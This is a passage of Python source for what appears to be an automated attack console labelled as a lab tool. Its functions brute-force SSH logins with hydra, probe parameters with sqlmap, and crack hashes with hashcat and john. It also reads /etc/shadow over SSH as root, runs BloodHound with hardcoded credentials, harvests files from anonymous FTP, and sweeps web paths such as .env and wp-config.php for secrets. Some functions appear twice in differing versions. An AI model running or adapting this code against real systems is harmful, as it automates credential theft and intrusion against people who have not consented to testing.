            sql_findings = extract_interesting_lines(result["stdout"], [r"\[CRITICAL\]", r"\[WARNING\]", r"Parameter:", r"Type:", r"Title:", r"back-end DBMS", r"payload"], limit=12)
            events.append({"kind": "evidence", "severity": "critical", "summary": f"🔥 SQL INJECTION found in parameter: {param}", "details": sql_findings or ["SQL injection confirmed"], "artifacts": {"vulnerable_parameter": param, "sqlmap_output": result["stdout"][:3000], "sql_findings": sql_findings}})
            break
    
    if job_id:
        safe_update_progress(job_id, 90)
        safe_append_log(job_id, "✅ SQL validation completed", "info")
    
    return events

def real_auth_control(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    
    try:
        if job_id:
            safe_append_log(job_id, "🔍 Starting auth control review...", "info")
            safe_update_progress(job_id, 10)
    except Exception:
        pass
    
    if not check_tool_availability("hydra"):
        events.append({"kind": "log", "severity": "warning", "message": "❌ hydra not found - skipping"})
        return events
    
    user_wordlist = preferred_small_user_wordlist()
    pass_wordlist = preferred_small_password_wordlist()
    
    events.append({"kind": "log", "severity": "critical", "message": f"🔥 Running auth testing ({profile})"})
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        ssh_open = sock.connect_ex((target, 22)) == 0
        sock.close()
        
        if ssh_open:
            if profile == "fast":
                cmd = f"hydra -L {user_wordlist} -e nsr -t 2 -f ssh://{target}"
            elif profile == "deep":
                cmd = f"hydra -L {user_wordlist} -P {pass_wordlist} -t 4 -f -W 3 ssh://{target}"
            else:
                cmd = f"hydra -L {user_wordlist} -P {pass_wordlist} -t 4 -f ssh://{target}"
            
            result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=120)
            if result["success"] and "login:" in result["stdout"]:
                credential_hits = parse_hydra_credentials(result["stdout"])
                details = credential_hits if credential_hits else [line for line in result["stdout"].split("\n") if "login:" in line][:10]
                events.append({"kind": "evidence", "severity": "high", "summary": "SSH authentication findings", "details": details, "artifacts": {"hydra_output": result["stdout"][:2000], "credential_hits": credential_hits}})
    except Exception:
        pass
    
    if job_id:
        safe_update_progress(job_id, 90)
        safe_append_log(job_id, "✅ Auth control review completed", "info")
    
    return events

def real_session_review(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    
    try:
        if job_id:
            safe_append_log(job_id, "🔍 Starting session review...", "info")
            safe_update_progress(job_id, 10)
    except Exception:
        pass
    
    events.append({"kind": "log", "severity": "warning", "message": f"🔥 Running session review ({profile})"})
    
    if check_tool_availability("jwt-tool"):
        cmd = f"jwt-tool -t http://{target} -M at"
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=60)
        if result["success"] and result["stdout"]:
            jwt_findings = extract_interesting_lines(result["stdout"], [r"alg", r"none", r"signature", r"weak", r"kid", r"token", r"header", r"claim"], limit=12)
            events.append({"kind": "evidence", "severity": "medium", "summary": "JWT analysis completed", "details": jwt_findings or [line for line in result["stdout"].split("\n") if line.strip()][:10], "artifacts": {"jwt_output": result["stdout"][:2000], "jwt_findings": jwt_findings}})
    
    if check_tool_availability("curl"):
        cmd = f"curl -skI http://{target} | grep -i cookie"
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=20)
        if result["success"] and result["stdout"]:
            cookies = [line.strip() for line in result["stdout"].splitlines() if line.strip()]
            events.append({"kind": "evidence", "severity": "low", "summary": "Cookie analysis", "details": cookies[:10], "artifacts": {"cookies": cookies}})
    
    if job_id:
        safe_update_progress(job_id, 90)
        safe_append_log(job_id, "✅ Session review completed", "info")
    
    return events

def real_sql_validation(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    candidate_urls = discovered_web_targets(job_id, target)
    primary_url = candidate_urls[0].rstrip("/")

    try:
        if job_id:
            safe_append_log(job_id, "Starting SQL validation...", "info")
            safe_append_log(job_id, f"Reusing discovery targets: {', '.join(candidate_urls[:3])}", "info")
            safe_update_progress(job_id, 10)
    except Exception:
        pass

    if not check_tool_availability("sqlmap"):
        events.append({"kind": "log", "severity": "warning", "message": "sqlmap not found - skipping"})
        return events

    events.append({"kind": "log", "severity": "critical", "message": f"Running SQL injection test ({profile})"})

    params = ["id", "q", "page", "user", "cat"]
    param_limit = 1 if profile == "fast" else 1 if profile == "balanced" else 2
    tested_params: list[str] = []
    for param in params[:param_limit]:
        tested_params.append(param)
        if profile == "fast":
            cmd = f"sqlmap -u {primary_url}/?{param}=1 --batch --smart --risk=1 --level=1 --timeout=10 --retries=1 --keep-alive"
        elif profile == "deep":
            cmd = f"sqlmap -u {primary_url}/?{param}=1 --batch --smart --risk=2 --level=2 --threads=2 --timeout=20 --retries=1 --keep-alive"
        else:
            cmd = f"sqlmap -u {primary_url}/?{param}=1 --batch --smart --risk=2 --level=2 --timeout=15 --retries=1 --keep-alive"

        if job_id:
            safe_append_log(job_id, f"Testing injectable parameter candidate: {param}", "info")
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=120 if profile == "deep" else 90)
        if result.get("cancelled"):
            events.append({"kind": "log", "severity": "warning", "message": "SQL validation stopped by operator"})
            return events
        if result["success"] and "vulnerable" in result["stdout"].lower():
            sql_findings = extract_interesting_lines(result["stdout"], [r"\[CRITICAL\]", r"\[WARNING\]", r"Parameter:", r"Type:", r"Title:", r"back-end DBMS", r"payload"], limit=12)
            events.append({
                "kind": "evidence",
                "severity": "critical",
                "summary": f"SQL injection found in parameter: {param}",
                "details": sql_findings or ["SQL injection confirmed"],
                "artifacts": {
                    "vulnerable_parameter": param,
                    "sqlmap_output": result["stdout"][:3000],
                    "sql_findings": sql_findings,
                    "command": cmd,
                },
            })
            break
        if result.get("stderr"):
            stderr_lines = unique_text_lines([line for line in str(result["stderr"]).splitlines() if line.strip()], limit=4)
            if stderr_lines:
                events.append({"kind": "log", "severity": "warning", "message": f"sqlmap note ({param}): {' ; '.join(stderr_lines)}"})
        if result.get("stdout"):
            summary_lines = extract_interesting_lines(
                result["stdout"],
                [r"all tested parameters do not appear to be injectable", r"does not seem to be injectable", r"\[WARNING\]", r"\[ERROR\]"],
                limit=4,
            )
            if summary_lines:
                events.append({"kind": "log", "severity": "info", "message": f"sqlmap summary ({param}): {' ; '.join(summary_lines)}"})

    if job_id:
        safe_update_progress(job_id, 90)
        safe_append_log(job_id, "SQL validation completed", "info")
    if not any(event.get("kind") == "evidence" for event in events):
        events.append({
            "kind": "log",
            "severity": "info",
            "message": f"No injectable parameter confirmed from quick sqlmap validation ({', '.join(tested_params) or 'none'}).",
        })

    return events

def real_session_review(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    candidate_urls = discovered_web_targets(job_id, target)
    primary_url = candidate_urls[0].rstrip("/")

    try:
        if job_id:
            safe_append_log(job_id, "Starting session review...", "info")
            safe_append_log(job_id, f"Reusing discovery targets: {', '.join(candidate_urls[:3])}", "info")
            safe_update_progress(job_id, 10)
    except Exception:
        pass

    events.append({"kind": "log", "severity": "warning", "message": f"Running session review ({profile})"})

    if check_tool_availability("jwt-tool"):
        cmd = f"jwt-tool -t {primary_url} -M at"
        if profile == "deep":
            cmd = f"{cmd} -S hs256"
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=60)
        if result["success"] and result["stdout"]:
            jwt_findings = extract_interesting_lines(result["stdout"], [r"alg", r"none", r"signature", r"weak", r"kid", r"token", r"header", r"claim"], limit=12)
            events.append({
                "kind": "evidence",
                "severity": "medium",
                "summary": "JWT analysis completed",
                "details": jwt_findings or [line for line in result["stdout"].split("\n") if line.strip()][:10],
                "artifacts": {
                    "jwt_output": result["stdout"][:2000],
                    "jwt_findings": jwt_findings,
                    "command": cmd,
                },
            })

    if profile != "fast" and check_tool_availability("curl"):
        cmd = f"curl -skI {primary_url} | grep -i cookie"
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=20)
        if result["success"] and result["stdout"]:
            cookies = [line.strip() for line in result["stdout"].splitlines() if line.strip()]
            events.append({
                "kind": "evidence",
                "severity": "low",
                "summary": "Cookie analysis",
                "details": cookies[:10],
                "artifacts": {"cookies": cookies, "command": cmd},
            })

    if job_id:
        safe_update_progress(job_id, 90)
        safe_append_log(job_id, "Session review completed", "info")

    return events

def real_hashcat_impact(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    
    try:
        if job_id:
            safe_append_log(job_id, "🔍 Starting hashcat impact analysis...", "info")
            safe_update_progress(job_id, 10)
    except Exception:
        pass
    
    if not check_tool_availability("hashcat"):
        events.append({"kind": "log", "severity": "warning", "message": "❌ hashcat not found - skipping"})
        return events
    
    password_wordlist = preferred_small_password_wordlist()
    events.append({"kind": "log", "severity": "critical", "message": f"🔥 Running hashcat analysis ({profile})"})
    
    hashes_file = Path("hashes.txt")
    if not hashes_file.exists():
        events.append({"kind": "log", "severity": "warning", "message": "No hashes.txt found - creating sample"})
        with open(hashes_file, "w") as f:
            f.write("$6$salt$hash1:user1\n")
    
    cmd = f"hashcat -m 1000 {hashes_file} {password_wordlist} --show"
    result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=60)
    
    if result["success"]:
        cracked = []
        for line in result["stdout"].split("\n"):
            if ":" in line and not line.startswith("#"):
                parts = line.split(":")
                if len(parts) >= 2:
                    cracked.append(f"{parts[0]} -> {':'.join(parts[1:])}")
        
        if cracked:
            events.append({"kind": "evidence", "severity": "critical", "summary": f"🔥 {len(cracked)} hashes cracked", "details": [f"Password recovered: {c}" for c in cracked[:10]], "artifacts": {"cracked_hashes": cracked, "password_hits": cracked, "command": cmd}})
    
    if job_id:
        safe_update_progress(job_id, 90)
        safe_append_log(job_id, "✅ Hashcat impact analysis completed", "info")
    
    return events

def real_john_audit(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)

    try:
        if job_id:
            safe_append_log(job_id, "Starting john password audit...", "info")
            safe_update_progress(job_id, 10)
    except Exception:
        pass

    if not check_tool_availability("john"):
        events.append({"kind": "log", "severity": "warning", "message": "john not found - skipping"})
        return events

    password_wordlist = preferred_small_password_wordlist()
    hashes_file = Path("hashes.txt")
    if not hashes_file.exists():
        events.append({"kind": "log", "severity": "warning", "message": "No hashes.txt found - skipping john audit"})
        return events

    if profile == "fast":
        commands = [f"john --show {hashes_file}"]
    elif profile == "deep":
        commands = [
            f"john --wordlist={password_wordlist} --rules {hashes_file}",
            f"john --show {hashes_file}",
        ]
    else:
        commands = [
            f"john --wordlist={password_wordlist} {hashes_file}",
            f"john --show {hashes_file}",
        ]

    events.append({"kind": "log", "severity": "critical", "message": f"Running john password audit ({profile})"})

    combined_output: list[str] = []
    for cmd in commands:
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=90 if profile == "deep" else 60)
        stdout = (result.get("stdout") or "").strip()
        if stdout:
            combined_output.append(stdout)

    parsed_hits: list[str] = []
    for line in "\n".join(combined_output).splitlines():
        clean = line.strip()
        if not clean or clean.startswith("#"):
            continue
        if ":" in clean and "password hash" not in clean.lower():
            parsed_hits.append(clean[:220])

    if parsed_hits:
        events.append({
            "kind": "evidence",
            "severity": "high",
            "summary": f"John identified {len(parsed_hits)} password audit hit(s)",
            "details": parsed_hits[:12],
            "artifacts": {
                "john_hits": parsed_hits[:20],
                "john_output": "\n".join(combined_output)[:3000],
                "commands": commands,
            },
        })

    if job_id:
        safe_update_progress(job_id, 90)
        safe_append_log(job_id, "John password audit completed", "info")

    return events

def real_credential_impact(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    
    try:
        if job_id:
            safe_append_log(job_id, "🔍 Starting credential impact analysis...", "info")
            safe_update_progress(job_id, 10)
    except Exception:
        pass
    
    events.append({"kind": "log", "severity": "critical", "message": f"🔥 Running credential impact analysis ({profile})"})
    
    if profile != "fast":
        cmd = f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 root@{target} 'cat /etc/shadow 2>/dev/null || echo \"shadow_not_accessible\"'"
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=30)
        
        if result["success"] and "shadow_not_accessible" not in result["stdout"]:
            users = []
            for line in result["stdout"].split("\n"):
                if ":" in line and not line.startswith("#"):
                    parts = line.split(":")
                    if len(parts) >= 2 and parts[1] and len(parts[1]) > 10:
                        users.append(parts[0])
            
            if users:
                credential_hits = [f"{u}: hash extracted" for u in users[:20]]
                events.append({"kind": "evidence", "severity": "critical", "summary": f"🔥 {len(users)} credential hashes extracted", "details": [f"User: {u}" for u in users[:10]], "artifacts": {"users": users, "credential_hits": credential_hits, "shadow_content": result["stdout"][:2000]}})
    
    if job_id:
        safe_update_progress(job_id, 90)
        safe_append_log(job_id, "✅ Credential impact analysis completed", "info")
    
    return events

def real_lateral_movement(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    
    try:
        if job_id:
            safe_append_log(job_id, "🔍 Starting lateral movement analysis...", "info")
            safe_update_progress(job_id, 10)
    except Exception:
        pass
    
    if not check_tool_availability("bloodhound-python"):
        events.append({"kind": "log", "severity": "warning", "message": "❌ bloodhound-python not found - skipping"})
        return events
    
    events.append({"kind": "log", "severity": "critical", "message": f"🔥 Running lateral movement analysis ({profile})"})
    
    cmd = f"bloodhound-python -u user -p 'Password123!' -d lab.local -c All -ns {target}"
    if profile == "deep":
        cmd = f"bloodhound-python -u user -p 'Password123!' -d lab.local -c All,Session -ns {target}"
    
    result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=180 if profile == "deep" else 120)
    if result["success"] and result["stdout"]:
        bloodhound_findings = extract_interesting_lines(result["stdout"], [r"session", r"admin", r"path", r"edge", r"group", r"user", r"computer"], limit=12)
        events.append({"kind": "evidence", "severity": "critical", "summary": "Lateral movement path analysis completed", "details": bloodhound_findings or ["BloodHound data collected for attack path analysis"], "artifacts": {"bloodhound_output": result["stdout"][:2000], "bloodhound_findings": bloodhound_findings, "command": cmd}})
    
    if job_id:
        safe_update_progress(job_id, 90)
        safe_append_log(job_id, "✅ Lateral movement analysis completed", "info")
    
    return events

def redact_sensitive_info(content: str) -> str:
    patterns = {
        r'password\s*[:=]\s*["\']?([^"\'\n]+)["\']?': 'password=[REDACTED]',
        r'pass\s*[:=]\s*["\']?([^"\'\n]+)["\']?': 'pass=[REDACTED]',
        r'api[_-]?key\s*[:=]\s*["\']?([^"\'\n]+)["\']?': 'api_key=[REDACTED]',
        r'secret\s*[:=]\s*["\']?([^"\'\n]+)["\']?': 'secret=[REDACTED]',
        r'token\s*[:=]\s*["\']?([^"\'\n]+)["\']?': 'token=[REDACTED]',
        r'auth\s*[:=]\s*["\']?([^"\'\n]+)["\']?': 'auth=[REDACTED]',
        r'key\s*[:=]\s*["\']?([^"\'\n]+)["\']?': 'key=[REDACTED]',
        r'Bearer\s+[A-Za-z0-9._\-]+': 'Bearer [REDACTED]',
    }
    redacted = content
    for pattern, replacement in patterns.items():
        redacted = re.sub(pattern, replacement, redacted, flags=re.IGNORECASE)
    return redacted

def extract_sensitive_lines(content: str) -> list[str]:
    keywords = [
        "password", "pass", "pwd", "secret", "key", "token", "auth",
        "credential", "username", "user", "login", "api_key", "private",
        "ssh", "rsa", "dsa", "ecdsa", "jwt", "bearer", "db_", "mysql",
    ]
    sensitive_lines: list[str] = []
    for raw in content.splitlines():
        line = raw.strip()
        if not line:
            continue
        lowered = line.lower()
        if any(keyword in lowered for keyword in keywords):
            sensitive_lines.append(redact_sensitive_info(line)[:220])
    return sensitive_lines[:30]

def candidate_web_urls(target: str, file_path: str) -> list[str]:
    raw = str(file_path or "").strip()
    if not raw:
        return []
    if raw.startswith("http://") or raw.startswith("https://"):
        return [raw]
    path = raw if raw.startswith("/") else f"/{raw}"
    return [f"http://{target}{path}", f"https://{target}{path}"]

def fetch_url_sample(url: str, max_bytes: int = 65536) -> dict[str, Any]:
    request = urllib.request.Request(
        url,
        headers={
            "User-Agent": "AuthorizedLabConsole/1.0",
            "Range": f"bytes=0-{max_bytes - 1}",
        },
        method="GET",
    )
    context = ssl._create_unverified_context() if url.startswith("https://") else None
    try:
        with urllib.request.urlopen(request, timeout=12, context=context) as response:
            body = response.read(max_bytes)
            status = int(getattr(response, "status", 200) or 200)
            content_type = str(response.headers.get("Content-Type", "") or "")
            return {
                "success": True,
                "status": status,
                "content_type": content_type,
                "body": body,
                "url": url,
            }
    except urllib.error.HTTPError as error:
        try:
            body = error.read(max_bytes)
        except Exception:
            body = b""
        return {
            "success": False,
            "status": int(getattr(error, "code", 0) or 0),
            "content_type": str(error.headers.get("Content-Type", "") or "") if getattr(error, "headers", None) else "",
            "body": body,
            "url": url,
            "error": str(error),
        }
    except Exception as error:
        return {
            "success": False,
            "status": 0,
            "content_type": "",
            "body": b"",
            "url": url,
            "error": str(error),
        }

def decode_sample_body(body: bytes) -> str:
    return body.decode("utf-8", errors="ignore")

def looks_like_html_error(content: str) -> bool:
    lowered = content.lower()
    if "<html" in lowered and ("404" in lowered or "not found" in lowered or "forbidden" in lowered):
        return True
    return False

def parse_robots_paths(content: str) -> list[str]:
    paths: list[str] = []
    for raw_line in str(content or "").splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        match = re.match(r"^(?:Disallow|Allow)\s*:\s*(\S+)", line, flags=re.IGNORECASE)
        if not match:
            continue
        value = match.group(1).strip()
        if not value or value == "/":
            continue
        if not value.startswith("/"):
            value = f"/{value}"
        paths.append(value)
    return unique_text_lines(paths, limit=20)

def parse_directory_listing_entries(content: str) -> list[str]:
    matches = re.findall(r'href=["\']([^"\']+)["\']', str(content or ""), flags=re.IGNORECASE)
    files: list[str] = []
    for match in matches:
        value = str(match or "").strip()
        if not value or value in {"../", "./", "/"}:
            continue
        if value.startswith("?") or value.startswith("#"):
            continue
        files.append(value)
    return unique_text_lines(files, limit=40)

def looks_like_directory_index(content: str) -> bool:
    lowered = str(content or "").lower()
    return "index of /" in lowered or "directory listing for /" in lowered or "<title>index of " in lowered

def fetch_small_ftp_file(ftp: FTP, filename: str, max_bytes: int = 32768) -> bytes:
    chunks: list[bytes] = []
    total = 0

    def on_chunk(chunk: bytes) -> None:
        nonlocal total
        if total >= max_bytes:
            raise StopIteration
        remaining = max_bytes - total
        piece = chunk[:remaining]
        chunks.append(piece)
        total += len(piece)
        if total >= max_bytes:
            raise StopIteration

    try:
        ftp.retrbinary(f"RETR {filename}", on_chunk)
    except StopIteration:
        pass
    except Exception:
        return b""
    return b"".join(chunks)

def review_anonymous_ftp(target: str) -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    try:
        with FTP() as ftp:
            ftp.connect(target, 21, timeout=8)
            ftp.login("anonymous", "anonymous@example.com")
            files = unique_text_lines(ftp.nlst(), limit=40)
            if not files:
                events.append({
                    "kind": "evidence",
                    "severity": "high",
                    "summary": "Anonymous FTP login allowed",
                    "details": ["Anonymous FTP login berhasil tanpa autentikasi tambahan.", "Tidak ada file yang terdaftar pada root FTP."],
                    "artifacts": {"ftp_anonymous": True, "ftp_listing": []},
                })
                return events

            sensitive_names = [
                name for name in files
                if re.search(r"(config|cred|backup|dump|db|pass|secret|key|txt|sql|env)", name, flags=re.IGNORECASE)
            ]
            suspicious_php = [name for name in files if name.lower().endswith(".php")]
            downloaded: list[str] = []
            sensitive_lines: list[str] = []

            for name in sensitive_names[:4]:
                body = fetch_small_ftp_file(ftp, name)
                if not body:
                    continue
                downloaded.append(name)
                content = decode_sample_body(body)
                sensitive_lines.extend(extract_sensitive_lines(content)[:10])

            details = [
                "Anonymous FTP login diizinkan.",
                f"Jumlah file yang terlihat: {len(files)}",
                "File teratas:",
                *files[:12],
            ]
            if downloaded:
                details.extend(["File yang berhasil diambil:", *downloaded[:6]])
            if sensitive_lines:
                details.extend(["Sensitive excerpts:", *sensitive_lines[:12]])
            elif sensitive_names:
                details.extend(["File sensitif terdeteksi pada listing:", *sensitive_names[:8]])

            events.append({
                "kind": "evidence",
                "severity": "critical" if sensitive_lines else "high",
                "summary": "Anonymous FTP exposure detected",
                "details": details[:28],
                "artifacts": {
                    "ftp_anonymous": True,
                    "ftp_listing": files,
                    "sensitive_files": sensitive_names[:20],
                    "suspicious_php_files": suspicious_php[:12],
                    "credential_hits": sensitive_lines[:20],
                    "ftp_downloaded_files": downloaded[:8],
                },
            })
    except Exception:
        return events
    return events

def review_web_exposure_from_hints(target: str, candidate_urls: list[str]) -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    primary_url = (candidate_urls or [f"http://{target}"])[0].rstrip("/") + "/"
    robots_result = fetch_url_sample(urljoin(primary_url, "robots.txt"), max_bytes=24576)
    robots_paths: list[str] = []
    if int(robots_result.get("status") or 0) in {200, 206}:
        robots_content = decode_sample_body(robots_result.get("body") or b"")
        robots_paths = parse_robots_paths(robots_content)
        if robots_paths:
            events.append({
                "kind": "evidence",
                "severity": "medium",
                "summary": "robots.txt exposes sensitive path hints",
                "details": ["robots.txt dapat diakses dan mengungkap path berikut:", *robots_paths[:12]],
                "artifacts": {
                    "robots_paths": robots_paths,
                    "download_url": robots_result.get("url"),
                    "http_observations": [f"robots.txt -> {robots_result.get('status')}"],
                },
            })

    if not robots_paths:
        robots_paths = ["/admin/", "/backup/", "/uploads/", "/app/setup/"]

    status_map: list[str] = []
    indexed_paths: list[str] = []
    suspicious_php_files: list[str] = []
    accessible_paths: list[str] = []
    for path in robots_paths[:10]:
        result = fetch_url_sample(urljoin(primary_url, path.lstrip("/")), max_bytes=65536)
        status = int(result.get("status") or 0)
        status_line = f"{path} -> {status if status else 'unreachable'}"
        status_map.append(status_line)
        if status in {200, 206}:
            accessible_paths.append(path)
            content = decode_sample_body(result.get("body") or b"")
            entries = parse_directory_listing_entries(content)
            if looks_like_directory_index(content):
                indexed_paths.append(path)
            if "uploads" in path.lower():
                suspicious_php_files.extend([
                    entry for entry in entries
                    if entry.lower().endswith(".php") or "webshell" in entry.lower()
                ])

    if accessible_paths:
        events.append({
            "kind": "evidence",
            "severity": "high",
            "summary": "Sensitive web directories publicly accessible",
            "details": [
                "Path sensitif yang berhasil diakses:",
                *accessible_paths[:12],
                "HTTP status map:",
                *status_map[:12],
            ],
            "artifacts": {
                "paths": accessible_paths[:20],
                "routes": status_map[:20],
                "indexed_paths": indexed_paths[:12],
                "robots_paths": robots_paths[:20],
            },
        })

    if indexed_paths:
        events.append({
            "kind": "evidence",
            "severity": "high",
            "summary": "Directory indexing exposed on sensitive paths",
            "details": ["Directory indexing aktif pada path berikut:", *indexed_paths[:12]],
            "artifacts": {
                "indexed_paths": indexed_paths[:20],
                "paths": indexed_paths[:20],
                "routes": status_map[:20],
            },
        })

    suspicious_php_files = unique_text_lines(suspicious_php_files, limit=20)
    if suspicious_php_files:
        events.append({
            "kind": "evidence",
            "severity": "high",
            "summary": "Suspicious PHP files exposed in uploads directory",
            "details": ["File PHP mencurigakan pada directory listing /uploads/:", *suspicious_php_files[:12]],
            "artifacts": {
                "suspicious_php_files": suspicious_php_files,
                "paths": ["/uploads/"],
                "exposed_files": suspicious_php_files[:20],
            },
        })

    return events

def safe_read_sensitive_file(target: str, file_path: str, job_id: str = "") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    allowed_extensions = {".txt", ".log", ".conf", ".ini", ".env", ".json", ".yaml", ".yml", ".xml", ".php"}
    normalized_path = str(file_path or "").strip()
    file_ext = Path(normalized_path).suffix.lower()
    if file_ext not in allowed_extensions and normalized_path not in {"/etc/passwd", "/etc/hosts", "/etc/hostname"}:
        events.append({"kind": "log", "severity": "warning", "message": f"Sensitive read blocked for unsupported file type: {normalized_path}"})
        return events

    fetch_result = None
    for url in candidate_web_urls(target, normalized_path):
        fetch_result = fetch_url_sample(url, max_bytes=65536)
        if fetch_result.get("success") and int(fetch_result.get("status") or 0) in {200, 206}:
            break

    if fetch_result and fetch_result.get("success") and int(fetch_result.get("status") or 0) in {200, 206}:
        try:
            content = decode_sample_body(fetch_result.get("body") or b"")
            if not content or looks_like_html_error(content):
                events.append({"kind": "log", "severity": "warning", "message": f"Downloaded content for {normalized_path} does not look like a readable file."})
                return events
            sensitive_lines = extract_sensitive_lines(content)
            redacted_preview = [redact_sensitive_info(line) for line in content.splitlines()[:8] if line.strip()]
            severity = "critical" if sensitive_lines else "high"
            events.append({
                "kind": "evidence",
                "severity": severity,
                "summary": f"Sensitive file reviewed: {normalized_path}",
                "details": [
                    f"File: {normalized_path}",
                    f"URL: {fetch_result['url']}",
                    f"HTTP status: {fetch_result['status']}",
                    f"Size: {len(content)} bytes",
                    f"Line count: {len(content.splitlines())}",
                    *(["Sensitive excerpts:"] + sensitive_lines[:12] if sensitive_lines else ["No obvious credential keywords found in downloaded content."]),
                ],
                "artifacts": {
                    "file_path": normalized_path,
                    "download_url": fetch_result["url"],
                    "file_type": file_ext or "special",
                    "has_sensitive_data": bool(sensitive_lines),
                    "sensitive_lines": sensitive_lines[:20],
                    "redacted_preview": redacted_preview[:8],
                    "command": f"GET {fetch_result['url']}",
                },
            })
        except Exception as error:
            events.append({"kind": "log", "severity": "warning", "message": f"Error parsing downloaded file sample: {error}"})
    else:
        status = fetch_result.get("status") if fetch_result else "unreachable"
        events.append({"kind": "log", "severity": "warning", "message": f"Sensitive file not downloadable: {normalized_path} (status: {status})"})

    return events

def discover_sensitive_files(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)

    candidate_paths = [
        "/.env",
        "/config.php",
        "/wp-config.php",
        "/.git/config",
        "/backup.sql",
        "/backup.zip",
        "/backup.tar.gz",
        "/.htpasswd",
        "/admin/.env",
        "/uploads/.env",
        "/api/.env",
        "/storage/logs/laravel.log",
        "/.well-known/security.txt",
        "/robots.txt",
    ]
    if profile != "fast":
        candidate_paths.extend([
            "/app/.env",
            "/config/.env",
            "/database.sql",
            "/dump.sql",
            "/debug.log",
            "/phpinfo.php",
        ])
    if profile == "deep":
        candidate_paths.extend([
            "/vendor/.env",
            "/public/.env",
            "/old/.env",
            "/test/.env",
            "/backup/.env",
            "/server-status",
        ])

    wildcard_fingerprints: dict[str, tuple[int, int, str]] = {}
    for probe_url in candidate_web_urls(target, f"/__lab_probe_missing__{uuid.uuid4().hex}"):
        probe_result = fetch_url_sample(probe_url, max_bytes=24576)
        probe_status = int(probe_result.get("status") or 0)
        probe_content = decode_sample_body(probe_result.get("body") or b"")
        probe_fingerprint = hashlib.sha1(probe_content.strip().encode("utf-8", errors="ignore")).hexdigest()[:16] if probe_content.strip() else ""
        parsed_probe = urlparse(probe_url)
        origin = f"{parsed_probe.scheme}://{parsed_probe.netloc}"
        wildcard_fingerprints[origin] = (
            probe_status,
            len(probe_content.strip()),
            probe_fingerprint,
        )

    discovered: list[str] = []
    exposed_files: list[str] = []
    checked_urls: list[str] = []
    for path in candidate_paths:
        for url in candidate_web_urls(target, path):
            checked_urls.append(url)
            fetch_result = fetch_url_sample(url, max_bytes=24576)
            status = int(fetch_result.get("status") or 0)
            if status not in {200, 206}:
                continue
            content = decode_sample_body(fetch_result.get("body") or b"")
            if not content or looks_like_html_error(content):
                continue
            stripped = content.strip()
            parsed_url = urlparse(url)
            origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
            baseline_status, baseline_len, baseline_fingerprint = wildcard_fingerprints.get(origin, (0, 0, ""))
            content_fingerprint = hashlib.sha1(stripped.encode("utf-8", errors="ignore")).hexdigest()[:16] if stripped else ""
            if (
                baseline_status in {200, 206}
                and baseline_fingerprint
                and baseline_fingerprint == content_fingerprint
                and abs(len(stripped) - baseline_len) <= 24
            ):
                continue
            sensitive_lines = extract_sensitive_lines(content)
            artifact_match = re.search(r"(\.env|config\.php|wp-config\.php|\.sql|\.git/config|\.htpasswd|backup\.(zip|sql|tar\.gz))", path, flags=re.IGNORECASE)
            lowered = stripped.lower()
            if ("<html" in lowered or "<!doctype html" in lowered) and not sensitive_lines:
                continue
            if not sensitive_lines and not artifact_match and len(stripped) < 24:
                continue
            discovered.append(path)
            if sensitive_lines or artifact_match:
                exposed_files.append(path)
            break

    if discovered:
        unique_discovered = list(dict.fromkeys(discovered))
        unique_exposed = list(dict.fromkeys(exposed_files))
        events.append({
            "kind": "evidence",
            "severity": "critical" if unique_exposed else "high",
            "summary": f"Sensitive file discovery: {len(unique_discovered)} downloadable files",
            "details": [
                f"Total downloadable files found: {len(unique_discovered)}",
                "Top file hits:",
                *unique_discovered[:20],
            ],
            "artifacts": {
                "sensitive_files": unique_discovered,
                "exposed_files": unique_exposed[:20],
                "command": "HTTP GET candidate sensitive paths",
                "checked_urls": checked_urls[:30],
            },
        })
    else:
        events.append({"kind": "log", "severity": "warning", "message": "No downloadable sensitive files discovered over HTTP/HTTPS."})

    return events

def read_sensitive_file(target: str, file_path: str, job_id: str = "") -> list[dict[str, Any]]:
    allowed_patterns = [
        r"^/etc/passwd$",
        r"^/etc/hosts$",
        r"^/etc/hostname$",
        r"^/home/[^/]+/\.ssh/authorized_keys$",
        r"^/home/[^/]+/\.bash_history$",
        r"^/root/\.bash_history$",
        r"^/var/www/html/\.env$",
